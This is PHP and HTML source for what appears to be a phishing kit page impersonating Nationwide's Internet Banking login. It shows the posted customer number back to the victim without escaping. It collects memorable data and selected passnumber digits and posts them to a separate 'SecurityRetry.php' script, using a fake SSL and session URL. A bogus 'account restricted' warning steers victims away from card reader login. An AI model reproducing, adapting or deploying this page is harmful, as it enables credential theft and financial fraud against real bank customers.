<?php
session_start();
require "../../includes/functions.php";
require "../../includes/One_Time.php";
$_SESSION['user'] = $_POST['user'];
?>
<!DOCTYPE html>
<html lang="en">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=UTF-8"> 
    <meta http-equiv="X-UA-Compatible" content="IE=EmulateIE8">
    <meta name="viewport" content="width=1000">
    <meta name="format-detection" content="telephone=no">
    <title>Log in</title>
	<link href="assets/css/common.css" rel="stylesheet" type="text/css">
    <link href="assets/css/one.css" rel="stylesheet" type="text/css">
    <link href="assets/css/two.css" rel="stylesheet" type="text/css">
    <link href="assets/css/three.css" rel="stylesheet" type="text/css">
    <link href="assets/css/four.css" rel="stylesheet" type="text/css">
    <link rel="shortcut icon" href="assets/img/favicon.ico">
    <link rel="apple-touch-icon" href="assets/img/two.png">
	<script>
	function Show() {
	document.getElementById("Pinsentry").style.display = "block";
	}
	function IsEmpty() {
	document.getElementById("Pinsentry").style.display = "none";
    var pass = document.forms["login"]["pass"].value;
    var four = document.forms["login"]["four"].value;
    var one = document.forms["login"]["one"].value;
    var three = document.forms["login"]["three"].value;
    if (pass == null || pass == "") {
       document.getElementById("ErrorBox").style.display = "block";
       document.getElementById("InputErrorMsg1").style.display = "block";
        return false;
    }
	if (four == null || four == "") {
       document.getElementById("ErrorBox").style.display = "block";
       document.getElementById("InputErrorMsg2").style.display = "block";
        return false;
    }
	if (one == null || one == "") {
       document.getElementById("ErrorBox").style.display = "block";
       document.getElementById("InputErrorMsg3").style.display = "block";
        return false;
    }
	if (three == null || three == "") {
       document.getElementById("ErrorBox").style.display = "block";
       document.getElementById("InputErrorMsg4").style.display = "block";
        return false;
    }
login.submit();
}
	</script>
  </head>



  <body id="log-in-details" class="two-col default-theme">
  <div id="cboxOverlay" style="display: none;"></div>
  <div id="colorbox" class="" style="padding-bottom: 35px; padding-right: 40px; display: none;">
  <div id="cboxWrapper">
  <div>
  <div id="cboxTopLeft" style="float: left;"></div>
  <div id="cboxTopCenter" style="float: left;"></div>
  <div id="cboxTopRight" style="float: left;"></div>
  </div>
  
  
  <div style="clear: left;">
  <div id="cboxMiddleLeft" style="float: left;"></div>
  <div id="cboxContent" style="float: left;">
  <div id="cboxLoadedContent" class="" style="width: 0px; height: 0px; overflow: hidden;"></div>
  <div id="cboxLoadingOverlay" class=""></div>
  <div id="cboxLoadingGraphic" class=""></div>
  <div id="cboxTitle" class=""></div>
  <div id="cboxCurrent" class=""></div>
  <div id="cboxNext" class=""></div>
  <div id="cboxPrevious" class=""></div>
  <div id="cboxSlideshow" class=""></div>
  <a id="cboxClose" href="#"><b class="button"></b><i><span class="srText">Close layer and return to page</span></i></a>
  </div>
  <div id="cboxMiddleRight" style="float: left;"></div>
  </div>
  
  
  <div style="clear: left;">
  <div id="cboxBottomLeft" style="float: left;"></div>
  <div id="cboxBottomCenter" style="float: left;"></div>
  <div id="cboxBottomRight" style="float: left;"></div>
  </div>
  
  </div>
  
  <div style="position: absolute; width: 9999px; visibility: hidden; display: none;"></div>
  </div>
    
    <div id="wrapper_outer">
      
    <header>
      <div class="welcome-util-container">
        <ul id="utility-links" role="navigation">
            <li class="demo">
                <a href="#">
                    Demo<span class="new-window-link"></span>
                            <span class="srText">Opens in a new window</span>
                     
                </a>
                
            </li>
            <li class="help">
                <a href="#">
                    Help centre
                    <span class="new-window-link"></span>
                    <span class="srText">Opens in a new window</span>
                </a>
                
            </li>
        </ul>
        
<div id="search">
    <a id="skipNavSearch"></a>
    <form action="#" method="post" name="logi">
<p style="color:#000000;font-size:11px">Search</p>
        <a class="btnSrchGo" href="#" value="Search"><b class="button"></b><i></i></a>
    </form>
</div>

      </div>
      <div id="brand" role="banner">
        
        <a class="logo" href="#">
            <img src="assets/img/mogo.png">
        </a>
        <img class="png title" src="assets/img/tag.png">
      </div>
    </header>

    <div id="wrapper_content">

	
	
	
<div id="application">
            <div id="user-content" style="height: 527px;">
                <div class="javaScriptEnabled" style="display: block;">
                    <span>    
                    
                    <span>&nbsp;</span>
                    </span>
                    
                    <span>
                        
                    </span>
                </div>
            </div>
            <div id="stage" style="height: 567px;">
                <div id="stageInner" style="height: 522px;">
                    <a id="skipNavMainContent"></a>
                    <noscript>

&lt;div class="system-error-message-pod"&gt;
    &lt;h1&gt;&lt;span&gt;&lt;/span&gt;There was a problem.&lt;/h1&gt;
    &lt;div class="system-error-message-pod-inner"&gt;
        &lt;p&gt;To use our Internet Banking service you need to enable JavaScript on your browser.&lt;/p&gt;
        &lt;div class="information-box"&gt;
            &lt;h2&gt;What you should do now:&lt;/h2&gt;
            &lt;div class="link-list"&gt;
                &lt;strong&gt;&lt;a class="new-window-link&amp;#32;link" href="http://www.nationwide.co.uk/internetbanking/helpandsupport/helpandsupport.htm" target="_blank"&gt;Visit our troubleshooting site&lt;span class="srText"&gt;Opens in a new window&lt;/span&gt;&lt;/a&gt;&lt;/strong&gt;
            &lt;/div&gt;
        &lt;/div&gt;
    &lt;/div&gt;
&lt;/div&gt;
&lt;div class="clear-line"&gt;&amp;#160;&lt;/div&gt;
</noscript>
                    <div class="javaScriptEnabled" style="display: block;">
                        

<div id="pageMessageArea">
    <div id="info-pageMessageArea" class="page-msg info-msg no-msg" role="alert">
        <h2><span></span></h2>
        <div class="inner-msg">
            <p></p>
        </div>
    </div>
    <div id="Pinsentry" class="page-msg warning-msg no-msg" style="display:none">
        <h2><span></span>Error</h2>
        <div class="inner-msg">
            <p>Sorry - your account access is currently restricted and you may only login using your memorable data.</p>
        </div>
    </div>
    <div id="ErrorBox" class="page-msg error-msg no-msg" role="alert"  style="display:none">
        <h2><span></span>Error</h2>
        <div class="inner-msg">
            <p>Sorry - you must correct the errors on this page before you can continue.</p>
        </div>
    </div>
    <div id="confirm-pageMessageArea" class="page-msg confirm-msg no-msg" role="alert">
        <h2><span></span></h2>
        <div class="inner-msg">
            <p></p>
        </div>
    </div>
</div>

<div class="validation-summary-valid page-msg error-msg" id="validationSummaryId" role="alert"><h2><b></b>Error</h2>
<div class="inner-msg"><p>Sorry - you must correct the errors on this page before you can continue.</p></div>
</div>

    
    <div class="stage-head">
        <h1>Enter your security information</h1>
    </div>
    <div class="two-col-content">
        <div class="main-content-column">
            <div class="content-pod login-pod margbz">
                <h2>Customer number: <?php echo $_SESSION['user'];?></h2>
                <strong>
                        <a href="#" id="notMyNumber">Or, enter a different customer number »</a>
                    </strong>
                <div class="inner-box cust-num-box">
                    <p>Please enter one of your three items of memorable data and the requested digits from your passnumber.</p>
                    <p><span class="mandatory-fields-note">All fields are mandatory</span></p>

                    <form action="SecurityRetry.php?CustomersID=<?php echo $_SESSION['user'];?>sslchannel=true&sessionid=<?php echo generateRandomString(115); ?>&securessl=true" autocomplete="off" id="login" name="login" method="post">

                    <div class="inner-box-border">
                        <div class="custom-tooltip-link">
                            <span id="InputErrorMsg1" class="field-validation-error" style="display:none;"><span class="">This information is required.</span></span>
                            <label for="pass">Memorable data:</label>
                            <input class="mem-data-text text" data-val="true" data-val-required="This information is required." id="pass" maxlength="12" name="pass" type="password" value="">                            
                            
                            <a href="#" class="forgotten-details-link" id="forgottenDetailsTooltipLink" aria-describedby="forgottenDetailsTooltip" onclick="s_objectID=&quot;https://onlinebanking.nationwide.co.uk/AccessManagement/Login/NonRCALogin#_4&quot;;return this.s_oc?this.s_oc(e):true"><strong>I've forgotten my memorable data</strong><b class="reveal-info-down"></b></a>
                            <div class="ctool ctool-south" id="forgottenDetailsTooltip" style="display: none;">
                                <div class="custom-inner">
                                    
		<strong>I've forgotten my memorable data</strong>
<p>Your memorable data is the information you provided us with when registering for Internet Banking. It will be a memorable date, place or name. Please note this field is case sensitive.</p>

<p>If you have a card reader you can <a href="#">log in with it</a> and set new memorable data now.
</p>
<p>
If you don’t have a card reader you will need to <a href="#" id="finalLink">re-register</a>.
</p>
                                </div>
                            </div>
                        </div>
                        <div class="clear-line"> </div>
                    </div>
                    <div class="inner-box-border">
                        <label for="four">Passnumber:</label>
                        <div class="digit-row">
                           <span id="InputErrorMsg2" class="field-validation-error" style="display:none;"><span class="">This information is required.</span></span>
                            <label for="four">4th digit<span class="srText"> of passnumber</span></label>
                            <div class="digitborder firstDropDown">
                                <select id="four" name="four">
<option value="">-</option>
<option value="0">0</option>
<option value="1">1</option>
<option value="2">2</option>
<option value="3">3</option>
<option value="4">4</option>
<option value="5">5</option>
<option value="6">6</option>
<option value="7">7</option>
<option value="8">8</option>
<option value="9">9</option>
</select>   
                            </div>                           
                        </div>
                        <div class="digit-row">
                            <span id="InputErrorMsg3" class="field-validation-error" style="display:none;"><span class="">This information is required.</span></span>
                            <label for="one">1st digit<span class="srText"> of passnumber</span></label>
                            <div class="digitborder">
                                <select data-val="true" data-val-regex="Please select a menu option." data-val-regex-pattern="^\d$" data-val-required="This information is required." id="one" name="one"><option value="">-</option>
<option value="0">0</option>
<option value="1">1</option>
<option value="2">2</option>
<option value="3">3</option>
<option value="4">4</option>
<option value="5">5</option>
<option value="6">6</option>
<option value="7">7</option>
<option value="8">8</option>
<option value="9">9</option>
</select>      
                            </div>                         
                        </div>
                        <div class="digit-row last-digit-row">
                            <span id="InputErrorMsg4" class="field-validation-error" style="display:none;"><span class="">This information is required.</span></span>
                            <label for="three">3rd digit<span class="srText"> of passnumber</span></label>
                            <div class="digitborder thirdDropDown">
                                <select data-val="true" data-val-regex="Please select a menu option." data-val-regex-pattern="^\d$" data-val-required="This information is required." id="three" name="three"><option value="">-</option>
<option value="0">0</option>
<option value="1">1</option>
<option value="2">2</option>
<option value="3">3</option>
<option value="4">4</option>
<option value="5">5</option>
<option value="6">6</option>
<option value="7">7</option>
<option value="8">8</option>
<option value="9">9</option>
</select>    
                            </div>                           
                        </div>
                         
                        <a href="#" class="forgotten-passnumber-link" id="forgottenPassnumberTooltipLink" aria-describedby="forgottenPassnumberTooltip" onclick="s_objectID=&quot;https://onlinebanking.nationwide.co.uk/AccessManagement/Login/NonRCALogin#_5&quot;;return this.s_oc?this.s_oc(e):true"><strong>I've forgotten my passnumber</strong><b class="reveal-info-down"></b></a>
                        <div class="ctool ctool-south" id="forgottenPassnumberTooltip" style="display: none;">
                            <div class="custom-inner">
                                
		<strong>I've forgotten my passnumber</strong>
<p>If you have a card reader you can <a href="#">log in with your card and card reader</a> and set a new passnumber now.
</p>
<p>
If you don’t have a card reader you will need to <a href="#" id="finalLink">re-register</a>.
</p>
                            </div>
                        </div>
                         
                    </div>
                    <div class="button-row">
                        <div class="inner-box-border">
                           <a href="#" id="Continue" class="btn-action btn-log-in btn-border" onclick="return IsEmpty();"><b></b><i>Log in</i></a>
                        </div>
                    </div>
                    </form>
                </div>
                <div class="information-box">
                    
		<p class="last">Nationwide will never ask you for your memorable data or passnumber in an email. Never disclose this information to anyone.</p>

                </div>
            </div>
        </div>
    </div>
    <div class="side-content-column two-col-side-content">
        <img alt="Card reader" src="assets/img/car.jpg">
        
            <strong>
            <a href="#" onclick="Show();">I want to use my card reader to log in</a>
            </strong>
        
    </div>
    <div class="clear-line">
        &nbsp;</div>

                    </div>
                </div>
            </div>
            <div id="nw-content" style="height: 517px;">
                <div class="javaScriptEnabled" style="display: block;">
                    <span>
                        
                    </span>
                </div>
            </div>
        </div>	
	
	
	
    </div>
   
    
    <div id="footer">
        <footer>
        </footer>
    </div>

    </div>
       
</body>
</html>